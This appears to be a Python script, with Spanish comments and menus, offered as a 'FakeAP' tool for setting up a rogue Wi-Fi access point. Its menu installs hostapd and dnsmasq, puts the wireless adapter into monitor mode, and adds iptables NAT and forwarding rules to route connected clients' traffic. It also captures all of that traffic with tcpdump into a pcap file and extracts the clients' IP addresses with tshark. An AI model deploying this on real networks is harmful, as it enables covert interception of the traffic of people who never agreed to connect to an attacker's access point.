import pywifi
import os
import subprocess

os.system("clear")

print("")

print("\033[32m                                ███████╗ █████╗ ██╗  ██╗███████╗ █████╗ ██████╗     \033[0m")
print("\033[32m                                ██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗██╔══██╗    \033[0m")
print("\033[32m                                █████╗  ███████║█████╔╝ █████╗  ███████║██████╔╝    \033[0m")
print("\033[32m                                ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██║██╔═══╝     \033[0m")
print("\033[32m                                ██║     ██║  ██║██║  ██╗███████╗██║  ██║██║         \033[0m")
print("\033[32m                                ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝         \033[0m")
print("                                                                                                   ")
print("\033[32m                                           https://github.com/bl4ck44                \033[0m")


if os.geteuid() == 0:
    pass
else:
    print("[+] Ejecute este script como root (usando sudo).")
    os.system("exit")



wifi = pywifi.PyWiFi()

# Obtiene la lista de adaptadores inalámbricos disponibles
interfaces = wifi.interfaces()

if len(interfaces) == 0:
    print("No se encontraron adaptadores inalámbricos disponibles.")
else:
    print("\033[1m\n[+] Adaptadores inalámbricos disponibles:\n\033[0m")

    # Almacena el nombre del primer adaptador en una variable
    primer_adaptador_nombre = interfaces[0].name()

    for i, iface in enumerate(interfaces, start=1):
        print(f"{i}. Nombre: {iface.name()}")



# Ejecuta el comando 'ip route' y captura la salida en una variable
try:
    resultado = subprocess.check_output(["ip", "route"])
    resultado = resultado.decode("utf-8")
except subprocess.CalledProcessError as e:
    print("Error al ejecutar el comando:", e)
    resultado = ""

# Busca la línea que contiene la palabra "default" (ruta predeterminada)
lineas = resultado.split('\n')
adaptador = None

for linea in lineas:
    if "default" in linea:
        partes = linea.split()
        indice = partes.index("dev")
        if indice < len(partes) - 1:
            adaptador = partes[indice + 1]
        break

# Verifica si se encontró un adaptador
if adaptador:
    print(f"\033[1m\n[+] El adaptador de red conectado a Internet es: {adaptador}\033[0m")
else:
    print("\033[1m\n[+] No se pudo determinar el adaptador de red conectado a Internet.\033[0m")



while True:                                                   
    print("\n\033[1m[1] Instalar requisitos\033[0m")
    print("\033[1m[2] Configurar FakeAP\033[0m")
    print("\033[1m[3] Procesar los registros para ordenar por IP\033[0m")
    print("\033[1m[4] Reiniciar la red y el sistema\033[0m")
    print("\033[1m[5] Salir\033[0m")
    opcion = input("\033[1m\n[+] Ingrese una opción: \033[0m")
    if opcion == "1":
        print("\033[1m\n[+] Instalando\n \033[0m")
        os.system("sudo apt-get install hostapd dnsmasq")
        print("\033[1m\n[+] Requisistos instalados\n \033[0m")
    elif opcion == "2":
        os.system(f"airmon-ng start {primer_adaptador_nombre}")
        os.system(f"ifconfig {primer_adaptador_nombre} up 192.168.1.1 netmask 255.255.255.0")
        os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
        os.system(f"iptables --table nat --append POSTROUTING --out-interface {adaptador} -j MASQUERADE")
        os.system(f"iptables --append FORWARD --in-interface {primer_adaptador_nombre} -j ACCEPT")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward\n")
        subprocess.Popen(['xterm', '-e', 'bash', '-c', f'tcpdump -i {primer_adaptador_nombre} -w trafico.pcap; exec bash'])
        subprocess.Popen(['xterm', '-e', 'bash', '-c', f'hostapd hostapd.conf -i {primer_adaptador_nombre}; exec bash'])
        subprocess.Popen(['xterm', '-e', 'bash', '-c', f'dnsmasq -C dnsmasq.conf -d -i {primer_adaptador_nombre}; exec bash'])
    elif opcion == "3":
        os.system("tshark -r trafico.pcap -T fields -e ip.src -e ip.dst > direcciones_ip.txt")
        os.system("sort direcciones_ip.txt > direcciones_ip_ordenadas.txt")
    elif opcion == "4":
        print("\033[1m\n[+] Reiniciando la red y el sistema\n \033[0m")
        os.system("systemctl restart NetworkManager.service")
        os.system("reboot")
    elif opcion == "5":
        # Salir del programa
        break
    else:
        print("Opción inválida")
